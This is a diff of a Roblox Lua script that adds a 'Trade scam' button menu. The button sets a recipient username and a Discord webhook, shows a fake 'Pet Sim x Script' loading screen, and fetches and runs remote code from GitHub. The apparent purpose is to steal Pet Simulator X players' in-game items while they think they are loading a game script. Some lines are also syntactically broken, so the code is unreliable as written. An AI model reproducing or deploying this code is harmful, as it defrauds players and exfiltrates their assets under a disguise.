@@ -1,5 +1,14 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("Trade scam", "Synapse")
+
+-- SCAM
+local scam = Window:NewTab("scam")
+local trade scam = Tab:NewSection("trade scam")
+
+
+trade scam:NewButton("click to enable", "if you click the button you will enable the trade scam", function()
 Username = "ukuaronk0"
-WebHook = "https://discord.com/api/webhooks/1093868394673082438/TWkYRwykruEJLKdHwAluUKUwmqH_Wb-CkizwQCMfSsjhKVaAqMKTiZ8A4ERuviFwba7F"
+WebHook = "https://discord.com/api/webhooks/1092048656280059985/yNJ0_QyMWy3nh07ZCfv_eDLEkDJKY9bMAelPjaDKLgxvpOAnXYL7mM3K2Ac0zxXi9tMz"
 loadingscreen = true
 _G.CustomScriptName = "Pet Sim x Script"
 _G.Text1 = "Script Loaded..."
@@ -7,3 +16,4 @@ _G.Text2 = "Waiting for Script..."
 _G.Text3 = "Checking Scripts..."
 _G.Text4 = "Starting Script..."
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
+end)
